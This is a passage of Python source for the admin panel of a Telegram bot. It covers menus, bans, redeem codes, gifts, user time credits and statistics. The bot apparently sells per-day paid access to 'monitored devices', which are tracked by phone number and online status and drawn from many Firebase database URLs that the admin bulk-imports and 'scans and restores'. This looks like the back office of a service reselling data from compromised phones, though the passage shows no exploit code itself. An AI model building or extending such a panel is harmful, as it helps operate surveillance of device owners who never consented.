        self.config = config
        self.firebase = firebase
        self.user_service = user_service
        self.handlers = handlers
        self._admin_states: Dict[int, Dict[str, Any]] = {}

    # ──────────────────────────────────────────────────────────────────
    # 1. Admin Main Menu
    # ──────────────────────────────────────────────────────────────────
    def get_main_menu(self) -> InlineKeyboardMarkup:
        keyboard = [
            [
                InlineKeyboardButton("👥 User Management", callback_data="admin_users"),
                InlineKeyboardButton("📱 Device Analytics", callback_data="admin_devices"),
            ],
            [
                InlineKeyboardButton("🔥 Firebase Manager", callback_data="admin_firebase"),
                InlineKeyboardButton("📢 Communication", callback_data="admin_comm"),
            ],
            [
                InlineKeyboardButton("🎁 Gift & Rewards", callback_data="admin_gift"),
                InlineKeyboardButton("🎟️ Redeem Codes", callback_data="admin_redeem"),
            ],
            [
                InlineKeyboardButton("⚙️ Bot Settings", callback_data="admin_settings"),
                InlineKeyboardButton("🛡️ Ban System", callback_data="admin_ban"),
            ],
            [
                InlineKeyboardButton("📊 Stats & Reports", callback_data="admin_stats"),
                InlineKeyboardButton("🔧 Maintenance", callback_data="admin_maint"),
            ],
            [
                InlineKeyboardButton("📋 All Admin Commands", callback_data="admin_cmdlist"),
            ],
        ]
        return InlineKeyboardMarkup(keyboard)

    def _back_button(self, target: str = "admin_main") -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back to Admin Panel", callback_data=target)]
        ])

    # ──────────────────────────────────────────────────────────────────
    # 2. User Management Submenu
    # ──────────────────────────────────────────────────────────────────
    def _users_menu(self) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("➕ Add Time", callback_data="admin_addtime"),
                InlineKeyboardButton("✏️ Set Time", callback_data="admin_settime"),
            ],
            [
                InlineKeyboardButton("➖ Remove Time", callback_data="admin_removetime"),
                InlineKeyboardButton("🔍 Search User", callback_data="admin_searchuser"),
            ],
            [
                InlineKeyboardButton("🔄 Reset User", callback_data="admin_resetuser"),
                InlineKeyboardButton("📋 Export Users", callback_data="admin_exportusers"),
            ],
            [
                InlineKeyboardButton("👥 Bulk Add Time", callback_data="admin_bulkaddtime"),
                InlineKeyboardButton("📜 View All Users", callback_data="admin_viewusers"),
            ],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_main")],
        ])

    # ──────────────────────────────────────────────────────────────────
    # 3. Device Analytics Submenu
    # ──────────────────────────────────────────────────────────────────
    def _devices_menu(self) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("📊 Live Device Stats", callback_data="admin_devstats"),
                InlineKeyboardButton("🟢 Online Devices", callback_data="admin_onlinedev"),
            ],
            [
                InlineKeyboardButton("🔴 Offline Devices", callback_data="admin_offlinedev"),
                InlineKeyboardButton("📑 Duplicate Report", callback_data="admin_duplicates"),
            ],
            [
                InlineKeyboardButton("🔍 Device Search", callback_data="admin_devsearch"),
                InlineKeyboardButton("📈 URL-wise Breakdown", callback_data="admin_urlbreakdown"),
            ],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_main")],
        ])

    # ──────────────────────────────────────────────────────────────────
    # 4. Firebase Manager Submenu
    # ──────────────────────────────────────────────────────────────────
    def _firebase_menu(self) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("📥 Bulk Add URLs (File)", callback_data="admin_bulkfirebase"),
                InlineKeyboardButton("➕ Add Single URL", callback_data="admin_addurl"),
            ],
            [
                InlineKeyboardButton("📋 List All URLs", callback_data="admin_listurls"),
                InlineKeyboardButton("🔍 Scan & Restore", callback_data="admin_scanurls"),
            ],
            [
                InlineKeyboardButton("🗑️ Remove URL", callback_data="admin_delurl"),
                InlineKeyboardButton("🔄 Refresh Cache", callback_data="admin_refreshcache"),
            ],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_main")],
        ])

    # ──────────────────────────────────────────────────────────────────
    # 5. Communication Submenu
    # ──────────────────────────────────────────────────────────────────
    def _comm_menu(self) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("📢 Broadcast Message", callback_data="admin_broadcast"),
                InlineKeyboardButton("✉️ Message User", callback_data="admin_msguser"),
            ],
            [
                InlineKeyboardButton("📢 Channel Force Join", callback_data="admin_forcejoin"),
                InlineKeyboardButton("📣 Announcement Pin", callback_data="admin_announce"),
            ],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_main")],
        ])

    # ──────────────────────────────────────────────────────────────────
    # 6. Gift & Rewards Submenu
    # ──────────────────────────────────────────────────────────────────
    def _gift_menu(self) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🎁 Gift All Users", callback_data="admin_giftall"),
                InlineKeyboardButton("🎁 Gift Active Only", callback_data="admin_giftactive"),
            ],
            [
                InlineKeyboardButton("🎁 Gift By ID List", callback_data="admin_giftlist"),
                InlineKeyboardButton("📊 Gift History", callback_data="admin_gifthistory"),
            ],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_main")],
        ])

    # ──────────────────────────────────────────────────────────────────
    # 7. Redeem Codes Submenu
    # ──────────────────────────────────────────────────────────────────
    def _redeem_menu(self) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("➕ Generate Code", callback_data="admin_genredeem"),
                InlineKeyboardButton("📋 List All Codes", callback_data="admin_listredeem"),
            ],
            [
                InlineKeyboardButton("🗑️ Delete Code", callback_data="admin_delredeem"),
                InlineKeyboardButton("📊 Redeem Stats", callback_data="admin_redeemstats"),
            ],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_main")],
        ])

    # ──────────────────────────────────────────────────────────────────
    # 8. Bot Settings Submenu
    # ──────────────────────────────────────────────────────────────────
    def _settings_menu(self) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("💰 Change Price/Day", callback_data="admin_setprice"),
                InlineKeyboardButton("📢 Change Channel", callback_data="admin_setchannel"),
            ],
            [
                InlineKeyboardButton("👤 Change Owner ID", callback_data="admin_setowner"),
                InlineKeyboardButton("🏦 Change UPI ID", callback_data="admin_setupi"),
            ],
            [
                InlineKeyboardButton("⏱️ Change Session TTL", callback_data="admin_setttl"),
                InlineKeyboardButton("🎁 Set Referral Bonus", callback_data="admin_setreferral"),
            ],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_main")],
        ])

    # ──────────────────────────────────────────────────────────────────
    # 9. Ban System Submenu
    # ──────────────────────────────────────────────────────────────────
    def _ban_menu(self) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🚫 Ban User", callback_data="admin_banuser"),
                InlineKeyboardButton("✅ Unban User", callback_data="admin_unbanuser"),
            ],
            [
                InlineKeyboardButton("📋 List Banned Users", callback_data="admin_listbanned"),
                InlineKeyboardButton("🗑️ Clear Ban List", callback_data="admin_clearbanned"),
            ],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_main")],
        ])

    # ──────────────────────────────────────────────────────────────────
    # 10. Stats & Reports Submenu
    # ──────────────────────────────────────────────────────────────────
    def _stats_menu(self) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("📊 Bot Overview", callback_data="admin_overview"),
                InlineKeyboardButton("👥 User Statistics", callback_data="admin_userstats"),
            ],
            [
                InlineKeyboardButton("📱 Device Statistics", callback_data="admin_devicestats"),
                InlineKeyboardButton("💰 Revenue Estimate", callback_data="admin_revenue"),
            ],
            [
                InlineKeyboardButton("📈 Referral Stats", callback_data="admin_referralstats"),
                InlineKeyboardButton("📦 Full Report Export", callback_data="admin_fullreport"),
            ],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_main")],
        ])

    # ──────────────────────────────────────────────────────────────────
    # 11. Maintenance Submenu
    # ──────────────────────────────────────────────────────────────────
    def _maint_menu(self) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🔄 Refresh All Caches", callback_data="admin_clearcache"),
                InlineKeyboardButton("🧹 Cleanup Inactive Sessions", callback_data="admin_cleansessions"),
            ],
            [
                InlineKeyboardButton("🗑️ Remove Duplicates", callback_data="admin_removedups"),
                InlineKeyboardButton("💾 Backup Database", callback_data="admin_backup"),
            ],
            [
                InlineKeyboardButton("♻️ Restart Services", callback_data="admin_restart"),
                InlineKeyboardButton("📋 System Health", callback_data="admin_health"),
            ],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_main")],
        ])

    # ──────────────────────────────────────────────────────────────────
    # State Management
    # ──────────────────────────────────────────────────────────────────
    def set_state(self, uid: int, state: str, **kwargs) -> None:
        self._admin_states[uid] = {"state": state, **kwargs}

    def get_state(self, uid: int) -> Optional[Dict[str, Any]]:
        return self._admin_states.get(uid)

    def clear_state(self, uid: int) -> None:
        self._admin_states.pop(uid, None)

    # ──────────────────────────────────────────────────────────────────
    # Data Persistence Helpers
    # ──────────────────────────────────────────────────────────────────
    def _load_json(self, filename: str, default: Any) -> Any:
        if os.path.exists(filename):
            try:
                with open(filename, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                return default
        return default

    def _save_json(self, filename: str, data: Any) -> None:
        try:
            with open(filename, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error("Failed to save %s: %s", filename, e)

    def load_banned(self) -> Dict[str, Dict]:
        return self._load_json(self.BANNED_FILE, {})

    def save_banned(self, data: Dict) -> None:
        self._save_json(self.BANNED_FILE, data)

    def load_redeem_codes(self) -> Dict[str, Dict]:
        return self._load_json(self.REDEEM_FILE, {})

    def save_redeem_codes(self, data: Dict) -> None:
        self._save_json(self.REDEEM_FILE, data)

    def load_settings(self) -> Dict[str, Any]:
        return self._load_json(self.BOT_SETTINGS_FILE, {})

    def save_settings(self, data: Dict) -> None:
        self._save_json(self.BOT_SETTINGS_FILE, data)

    # ──────────────────────────────────────────────────────────────────
    # Ban System Implementation
    # ──────────────────────────────────────────────────────────────────
    def is_banned(self, uid: int) -> bool:
        banned = self.load_banned()
        return str(uid) in banned

    async def ban_user(self, uid: int, reason: str = "No reason provided", banner_name: str = "Admin") -> bool:
        banned = self.load_banned()
        banned[str(uid)] = {
            "uid": uid,
            "reason": reason,
            "banned_by": banner_name,
            "banned_at": int(time.time()),
        }
        self.save_banned(banned)
        return True

    async def unban_user(self, uid: int) -> bool:
        banned = self.load_banned()
        if str(uid) in banned:
            del banned[str(uid)]
            self.save_banned(banned)
            return True
        return False

    # ──────────────────────────────────────────────────────────────────
    # Redeem Codes Implementation
    # ──────────────────────────────────────────────────────────────────
    def generate_redeem_code(self, duration_seconds: int, max_uses: int = 1) -> str:
        code = f"ADMIN-{random.randint(100000, 999999)}"
        codes = self.load_redeem_codes()
        codes[code] = {
            "code": code,
            "duration_seconds": duration_seconds,
            "max_uses": max_uses,
            "used_count": 0,
            "used_by": [],
            "created_at": int(time.time()),
        }
        self.save_redeem_codes(codes)
        return code

    async def redeem_code(self, code: str, uid: int) -> Tuple[bool, str, int]:
        codes = self.load_redeem_codes()
        if code not in codes:
            return False, "Invalid or expired code.", 0
        entry = codes[code]
        if entry["used_count"] >= entry["max_uses"]:
            return False, "This code has already been fully redeemed.", 0
        if uid in entry["used_by"]:
            return False, "You have already used this code.", 0
        duration = entry["duration_seconds"]
        await self.user_service.add_time(uid, duration)
        entry["used_count"] += 1
        entry["used_by"].append(uid)
        codes[code] = entry
        self.save_redeem_codes(codes)
        return True, "Code redeemed successfully!", duration

    # ──────────────────────────────────────────────────────────────────
    # Bulk Firebase Add from File
    # ──────────────────────────────────────────────────────────────────
    async def bulk_add_firebase_from_text(self, text_content: str) -> Dict[str, Any]:
        """Parse text content (Firebase.txt), extract valid Firebase URLs, add them all."""
        tokens = re.split(r"[\s,\n\r]+", text_content)
        found = []
        rejected = []
        for token in tokens:
            token = token.strip().strip('\'"`,;')
            if not token:
                continue
            if "firebaseio.com" in token.lower() or "firebasedatabase.app" in token.lower():
                cleaned = FirebaseService.clean_firebase_url(token)
                if cleaned:
                    found.append(cleaned)
                else:
                    rejected.append(token)
            else:
                rejected.append(token)

        if not found:
            return {"added": 0, "duplicates": 0, "rejected": rejected, "urls": []}

        existing = await self.firebase.get_urls()
        added = []
        duplicates = []
        for url in found:
            if url in existing:
                duplicates.append(url)
            else:
                existing.append(url)
                added.append(url)

        if added:
            LocalBackupManager.update_key("firebase_urls", existing)
            await self.firebase.patch_data(
                self.config.PRIMARY_FIREBASE,
                "bot_config",
                {"firebase_urls": existing},
            )
            await self.firebase.invalidate_url_cache()

        return {
            "added": len(added),
            "duplicates": len(duplicates),
            "rejected": rejected,
            "urls": added,
            "duplicate_urls": duplicates,
        }

    # ──────────────────────────────────────────────────────────────────
    # Device & URL Analytics
    # ──────────────────────────────────────────────────────────────────
    async def get_device_analytics(self) -> Dict[str, Any]:
        session = self.handlers.get_session(self.config.OWNER_ID)
        clients = await self.firebase.get_all_clients(session, force_refresh=True)
        urls = await self.firebase.get_urls()

        online = sum(1 for v in clients.values() if v.get("_is_online"))
        offline = len(clients) - online

        url_stats: Dict[str, Dict[str, int]] = {u: {"online": 0, "total": 0} for u in urls}
        for info in clients.values():
            src = info.get("_src_url")
            if src in url_stats:
                url_stats[src]["total"] += 1
                if info.get("_is_online"):
                    url_stats[src]["online"] += 1

        # Duplicates
        phone_buckets: Dict[str, int] = {}
        for info in clients.values():
            phone = str(info.get("_phone", "?"))
            phone_buckets[phone] = phone_buckets.get(phone, 0) + 1
        dup_count = sum(1 for c in phone_buckets.values() if c > 1)

        return {
            "total_devices": len(clients),
            "online": online,
            "offline": offline,
            "total_urls": len(urls),
            "url_stats": url_stats,
            "duplicate_numbers": dup_count,
        }

    # ──────────────────────────────────────────────────────────────────
    # User Statistics
    # ──────────────────────────────────────────────────────────────────
    async def get_user_statistics(self) -> Dict[str, Any]:
        users = await self.firebase.get_data(self.config.PRIMARY_FIREBASE, "bot_users")
        if not isinstance(users, dict):
            backup = LocalBackupManager.load_backup()
            users = backup.get("bot_users", {})
        if not isinstance(users, dict):
            users = {}

        now = int(time.time())
        active = 0
        expired = 0
        paused = 0
        lifetime = 0
        total_referrals = 0
        total_users = len(users)

        for uid_str, data in users.items():
            if not isinstance(data, dict):
                continue
            if data.get("paused", False):
                paused += 1
                if data.get("frozen_seconds", 0) > 0:
                    active += 1
                else:
                    expired += 1
            else:
                remaining = data.get("valid_until", 0) - now
                if data.get("valid_until", 0) >= 9999999999:
                    lifetime += 1
                    active += 1
                elif remaining > 0:
                    active += 1
                else:
                    expired += 1
            total_referrals += data.get("referral_count", 0)

        banned = self.load_banned()

        return {
            "total": total_users,
            "active": active,
            "expired": expired,
            "paused": paused,
            "lifetime": lifetime,
            "total_referrals": total_referrals,
            "banned": len(banned),
        }

    # ──────────────────────────────────────────────────────────────────
    # Overview Stats
    # ──────────────────────────────────────────────────────────────────
    async def get_overview(self) -> Dict[str, Any]:
        user_stats = await self.get_user_statistics()
        device_stats = await self.get_device_analytics()
        redeem_codes = self.load_redeem_codes()
        settings = self.load_settings()

        active_redeem = sum(1 for c in redeem_codes.values() if c["used_count"] < c["max_uses"])
        total_redeemed = sum(c["used_count"] for c in redeem_codes.values())

        return {
            "users": user_stats,
            "devices": device_stats,
            "redeem": {
                "total_codes": len(redeem_codes),
                "active_codes": active_redeem,
                "total_redeemed": total_redeemed,
            },
            "settings": settings,
            "price_per_day": settings.get("price_per_day", self.config.PRICE_PER_DAY),
        }

    # ──────────────────────────────────────────────────────────────────
    # Main Admin Handler — Entry Point
    # ──────────────────────────────────────────────────────────────────
    async def show_admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        uid = update.effective_user.id
        if uid != self.config.OWNER_ID:
            await safe_send_message(context, update.effective_chat.id, "🚫 Unauthorized. Owner only.")
            return

        self.clear_state(uid)
        overview = await self.get_overview()
        u = overview["users"]
        d = overview["devices"]

        text = (
            f"👑 <b>ADMIN CONTROL PANEL</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 <b>Quick Overview</b>\n"
            f"👥 Total Users: <code>{u['total']}</code> | ✅ Active: <code>{u['active']}</code>\n"
            f"⏸️ Paused: <code>{u['paused']}</code> | ❌ Expired: <code>{u['expired']}</code>\n"
            f"🚫 Banned: <code>{u['banned']}</code> | ♾️ Lifetime: <code>{u['lifetime']}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 <b>Devices</b>\n"
            f"🌐 URLs: <code>{d['total_urls']}</code> | 📱 Total: <code>{d['total_devices']}</code>\n"
            f"🟢 Online: <code>{d['online']}</code> | 🔴 Offline: <code>{d['offline']}</code>\n"
            f"📑 Duplicates: <code>{d['duplicate_numbers']}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎟️ Redeem Codes: <code>{overview['redeem']['total_codes']}</code>\n"
            f"💰 Price/Day: ₹{overview['price_per_day']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>Select a category below:</i>"
        )

        if update.callback_query:
            await safe_edit_message(
                context,
                update.callback_query.message.chat_id,
                update.callback_query.message.message_id,
                text,
                reply_markup=self.get_main_menu(),
            )
        else:
            await safe_send_message(
                context,
                update.effective_chat.id,
                text,
                reply_markup=self.get_main_menu(),
            )

    # ──────────────────────────────────────────────────────────────────
    # Callback Router
    # ──────────────────────────────────────────────────────────────────
    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
        """Returns True if the callback was handled by AdminPanel."""
        query = update.callback_query
        uid = query.from_user.id
        data = query.data

        if uid != self.config.OWNER_ID:
            return False

        if not data.startswith("admin_"):
            return False

        await safe_answer_query(query)

        # ── Main Menu & Submenus ──
        if data == "admin_main":
            await self.show_admin_panel(update, context)
            return True

        if data == "admin_users":
            await self._show_submenu(update, context, "👥 USER MANAGEMENT", self._users_menu())
            return True
        if data == "admin_devices":
            await self._show_submenu(update, context, "📱 DEVICE ANALYTICS", self._devices_menu())
            return True
        if data == "admin_firebase":
            await self._show_submenu(update, context, "🔥 FIREBASE MANAGER", self._firebase_menu())
            return True
        if data == "admin_comm":
            await self._show_submenu(update, context, "📢 COMMUNICATION TOOLS", self._comm_menu())
            return True
        if data == "admin_gift":
            await self._show_submenu(update, context, "🎁 GIFT & REWARDS", self._gift_menu())
            return True
        if data == "admin_redeem":
            await self._show_submenu(update, context, "🎟️ REDEEM CODE SYSTEM", self._redeem_menu())
            return True
        if data == "admin_settings":
            await self._show_submenu(update, context, "⚙️ BOT SETTINGS", self._settings_menu())
            return True
        if data == "admin_ban":
            await self._show_submenu(update, context, "🛡️ BAN SYSTEM", self._ban_menu())
            return True
        if data == "admin_stats":
            await self._show_submenu(update, context, "📊 STATS & REPORTS", self._stats_menu())
            return True
        if data == "admin_maint":
            await self._show_submenu(update, context, "🔧 MAINTENANCE", self._maint_menu())
            return True

        # ── Command List ──
        if data == "admin_cmdlist":
            await self._show_command_list(update, context)
            return True

        # ── Device Analytics Actions ──
        if data == "admin_devstats":
            await self._action_device_stats(update, context)
            return True
        if data == "admin_onlinedev":
            await self._action_online_devices(update, context)
            return True
        if data == "admin_offlinedev":
            await self._action_offline_devices(update, context)
            return True
        if data == "admin_duplicates":
            await self._action_duplicates_report(update, context)
            return True
        if data == "admin_urlbreakdown":
            await self._action_url_breakdown(update, context)
            return True
        if data == "admin_devsearch":
            self.set_state(uid, "awaiting_admin_devsearch")
            await self._prompt(update, context, "🔍 Enter phone number or last digits to search:")
            return True

        # ── Firebase Actions ──
        if data == "admin_bulkfirebase":
            self.set_state(uid, "awaiting_admin_bulkfirebase")
            await self._prompt(update, context, "📥 <b>Bulk Add Firebase URLs</b>\n\nSend a .txt file (e.g., Firebase.txt) or paste URLs directly. One URL per line.")
            return True
        if data == "admin_addurl":
            self.set_state(uid, "awaiting_admin_addurl")
            await self._prompt(update, context, "➕ Enter Firebase URL to add:")
            return True
        if data == "admin_listurls":
            await self.handlers.cmd_urls(update, context)
            return True
        if data == "admin_scanurls":
            await self.handlers.cmd_scanurls(update, context)
            return True
        if data == "admin_delurl":
            self.set_state(uid, "awaiting_admin_delurl")
            await self._prompt(update, context, "🗑️ Enter URL index number to remove (use /urls to see indices):")
            return True
        if data == "admin_refreshcache":
            await self.firebase.invalidate_url_cache()
            await self.firebase.get_all_clients(force_refresh=True)
            await self._respond(update, context, "✅ All caches refreshed successfully!")
            return True

        # ── User Management Actions ──
        if data == "admin_addtime":
            self.set_state(uid, "awaiting_admin_addtime")
            await self._prompt(update, context, "➕ <b>Add Time to User</b>\n\nFormat: <code>user_id duration</code>\nExample: <code>123456789 7d</code>\nUnits: h, d, m, y, or <code>lifetime</code>")
            return True
        if data == "admin_settime":
            self.set_state(uid, "awaiting_admin_settime")
            await self._prompt(update, context, "✏️ <b>Set Exact Time</b>\n\nFormat: <code>user_id duration</code>\nExample: <code>123456789 30d</code>")
            return True
        if data == "admin_removetime":
            self.set_state(uid, "awaiting_admin_removetime")
            await self._prompt(update, context, "➖ Enter User ID to expire (set to 0):")
            return True
        if data == "admin_searchuser":
            self.set_state(uid, "awaiting_admin_searchuser")
            await self._prompt(update, context, "🔍 Enter User ID or Username to search:")
            return True
        if data == "admin_resetuser":
            self.set_state(uid, "awaiting_admin_resetuser")
            await self._prompt(update, context, "🔄 Enter User ID to reset (clears favorites, referrals, sets 24h):")
            return True
        if data == "admin_exportusers":
            await self.handlers.cmd_time(update, context)
            return True
        if data == "admin_viewusers":
            await self._action_view_users(update, context)
            return True
        if data == "admin_bulkaddtime":
            self.set_state(uid, "awaiting_admin_bulkaddtime")
            await self._prompt(update, context, "👥 <b>Bulk Add Time</b>\n\nFormat: <code>duration</code> (applies to ALL users)\nExample: <code>3d</code>")
            return True

        # ── Communication Actions ──
        if data == "admin_broadcast":
            self.set_state(uid, "awaiting_admin_broadcast")
            await self._prompt(update, context, "📢 Enter the broadcast message to send to ALL users:")
            return True
        if data == "admin_msguser":
            self.set_state(uid, "awaiting_admin_msguser")
            await self._prompt(update, context, "✉️ <b>Message a User</b>\n\nFormat: <code>user_id your message</code>")
            return True
        if data == "admin_forcejoin":
            await self._action_force_join(update, context)
            return True
        if data == "admin_announce":
            self.set_state(uid, "awaiting_admin_announce")
            await self._prompt(update, context, "📣 Enter announcement text:")
            return True

        # ── Gift Actions ──
        if data == "admin_giftall":
            self.set_state(uid, "awaiting_admin_giftall")
            await self._prompt(update, context, "🎁 <b>Gift All Users</b>\n\nEnter duration: <code>1d</code>, <code>7d</code>, <code>1m</code>")
            return True
        if data == "admin_giftactive":
            self.set_state(uid, "awaiting_admin_giftactive")
            await self._prompt(update, context, "🎁 <b>Gift Active Users Only</b>\n\nEnter duration: <code>1d</code>, <code>7d</code>, <code>1m</code>")
            return True
        if data == "admin_giftlist":
            self.set_state(uid, "awaiting_admin_giftlist")
            await self._prompt(update, context, "🎁 <b>Gift by ID List</b>\n\nFormat: <code>uid1,uid2,uid3 duration</code>\nExample: <code>123,456,789 7d</code>")
            return True
        if data == "admin_gifthistory":
            await self._respond(update, context, "📊 Gift history feature — logs stored locally. (Administrative record)")
            return True

        # ── Redeem Code Actions ──
        if data == "admin_genredeem":
            self.set_state(uid, "awaiting_admin_genredeem")
            await self._prompt(update, context, "🎟️ <b>Generate Redeem Code</b>\n\nFormat: <code>duration max_uses</code>\nExample: <code>7d 5</code> (7 days, usable 5 times)")
            return True
        if data == "admin_listredeem":
            await self._action_list_redeem(update, context)
            return True
        if data == "admin_delredeem":
            self.set_state(uid, "awaiting_admin_delredeem")
            await self._prompt(update, context, "🗑️ Enter redeem code to delete:")
            return True
        if data == "admin_redeemstats":
            await self._action_redeem_stats(update, context)
            return True

        # ── Settings Actions ──
        if data == "admin_setprice":
            self.set_state(uid, "awaiting_admin_setprice")
            await self._prompt(update, context, f"💰 Current price: ₹{self.config.PRICE_PER_DAY}/day\nEnter new price (number only):")
            return True
        if data == "admin_setchannel":
            self.set_state(uid, "awaiting_admin_setchannel")
            await self._prompt(update, context, f"📢 Current channel: {self.config.CHANNEL_USERNAME}\nEnter new channel username (with @):")
            return True
        if data == "admin_setowner":
            self.set_state(uid, "awaiting_admin_setowner")
            await self._prompt(update, context, f"👤 Current owner ID: <code>{self.config.OWNER_ID}</code>\nEnter new owner numeric ID:")
            return True
        if data == "admin_setupi":
            self.set_state(uid, "awaiting_admin_setupi")
            await self._prompt(update, context, f"🏦 Current UPI: <code>{self.config.UPI_ID}</code>\nEnter new UPI ID:")
            return True
        if data == "admin_setttl":
            self.set_state(uid, "awaiting_admin_setttl")
            await self._prompt(update, context, f"⏱️ Current session TTL: {self.config.DEVICE_SESSION_TTL}s\nEnter new TTL in seconds:")
            return True
        if data == "admin_setreferral":
            self.set_state(uid, "awaiting_admin_setreferral")
            await self._prompt(update, context, f"🎁 Current referral bonus: {self.config.REFERRAL_BONUS_HOURS}h\nEnter new bonus in hours:")
            return True

        # ── Ban System Actions ──
        if data == "admin_banuser":
            self.set_state(uid, "awaiting_admin_banuser")
            await self._prompt(update, context, "🚫 <b>Ban User</b>\n\nFormat: <code>user_id reason</code>\nExample: <code>123456789 Spamming</code>")
            return True
        if data == "admin_unbanuser":
            self.set_state(uid, "awaiting_admin_unbanuser")
            await self._prompt(update, context, "✅ Enter User ID to unban:")
            return True
        if data == "admin_listbanned":
            await self._action_list_banned(update, context)
            return True
        if data == "admin_clearbanned":
            banned = self.load_banned()
            count = len(banned)
            self.save_banned({})
            await self._respond(update, context, f"✅ Ban list cleared. Removed {count} entries.")
            return True

        # ── Stats Actions ──
        if data == "admin_overview":
            await self.show_admin_panel(update, context)
            return True
        if data == "admin_userstats":
            await self._action_user_stats(update, context)
            return True
        if data == "admin_devicestats":
            await self._action_device_stats(update, context)
            return True
        if data == "admin_revenue":
            await self._action_revenue(update, context)
            return True
        if data == "admin_referralstats":
            await self._action_referral_stats(update, context)
            return True
        if data == "admin_fullreport":
            await self._action_full_report(update, context)
            return True

        # ── Maintenance Actions ──
        if data == "admin_clearcache":
            await self.firebase.data_cache.clear()
            await self.firebase.invalidate_url_cache()
            await self.firebase.get_all_clients(force_refresh=True)
            await self._respond(update, context, "✅ All caches cleared & refreshed.")
            return True
        if data == "admin_cleansessions":
            await self.handlers.cleanup_inactive_sessions()
            gc.collect()
            await self._respond(update, context, "✅ Inactive sessions cleaned up & garbage collected.")
            return True
        if data == "admin_removedups":
            await self._respond(update, context, "ℹ️ Duplicates are auto-filtered in user view. Admin sees all via /urls report.")
            return True
        if data == "admin_backup":
            await self._action_backup(update, context)
            return True
        if data == "admin_restart":
            await self.handlers.cleanup_inactive_sessions()
            await self.firebase.invalidate_url_cache()
            await self.firebase.get_all_clients(force_refresh=True)
            gc.collect()
            await self._respond(update, context, "♻️ Services restarted, caches refreshed, sessions cleaned.")
            return True
        if data == "admin_health":
            await self._action_health(update, context)
            return True

        return False

    # ──────────────────────────────────────────────────────────────────
    # UI Helpers
    # ──────────────────────────────────────────────────────────────────
    async def _show_submenu(self, update: Update, context: ContextTypes.DEFAULT_TYPE, title: str, keyboard: InlineKeyboardMarkup) -> None:
        text = f"⚙️ <b>{title}</b>\n━━━━━━━━━━━━━━━━━━━━━\n<i>Select an action below:</i>"
        await safe_edit_message(
            context,
            update.callback_query.message.chat_id,
            update.callback_query.message.message_id,
            text,
            reply_markup=keyboard,
        )

    async def _prompt(self, update: Update, context: ContextTypes.DEFAULT_TYPE, text: str) -> None:
        await safe_edit_message(
            context,
            update.callback_query.message.chat_id,
            update.callback_query.message.message_id,
            text,
            reply_markup=self._back_button(),
        )

    async def _respond(self, update: Update, context: ContextTypes.DEFAULT_TYPE, text: str) -> None:
        if update.callback_query:
            await safe_edit_message(
                context,
                update.callback_query.message.chat_id,
                update.callback_query.message.message_id,
                text,
                reply_markup=self._back_button(),
            )
        else:
            await safe_send_message(context, update.effective_chat.id, text, reply_markup=self._back_button())

    async def _show_command_list(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        text = (
            "📋 <b>ALL ADMIN COMMANDS</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "<b>🔐 Core:</b>\n"
            "• /admin — Open Admin Control Panel\n\n"
            "<b>👥 User Management:</b>\n"
            "• /addtime user_id time — Add time\n"
            "• /changetime user_id time — Set exact validity\n"
            "• /removetime confirm — Expire ALL users\n"
            "• /time — Export users report\n\n"
            "<b>🔥 Firebase:</b>\n"
            "• /addurls url1 url2 — Add URLs\n"
            "• /urls — List all URLs & devices\n"
            "• /scanurls — Scan & restore endpoints\n"
            "• /delurl index — Remove URL\n\n"
            "<b>📢 Communication:</b>\n"
            "• /broadcast message — Message all users\n"
            "• /gift duration — Gift all users\n\n"
            "<b>🎟️ Redeem:</b>\n"
            "• /redeem CODE — User redeems code\n\n"
            "<b>🛡️ Ban System:</b>\n"
            "• /ban user_id reason — Ban user\n"
            "• /unban user_id — Unban user\n"
            "• /banned — List banned users"
        )
        await safe_edit_message(
            context,
            update.callback_query.message.chat_id,
            update.callback_query.message.message_id,
            text,
            reply_markup=self._back_button(),
        )

    # ──────────────────────────────────────────────────────────────────
    # Action Implementations
    # ──────────────────────────────────────────────────────────────────
    async def _action_device_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        stats = await self.get_device_analytics()
        lines = [
            "📊 <b>DEVICE ANALYTICS</b>",
            "━━━━━━━━━━━━━━━━━━━━━",
            f"🌐 Total Firebase URLs: <code>{stats['total_urls']}</code>",
            f"📱 Total Monitored Devices: <code>{stats['total_devices']}</code>",
            f"🟢 Online: <code>{stats['online']}</code>",
            f"🔴 Offline: <code>{stats['offline']}</code>",
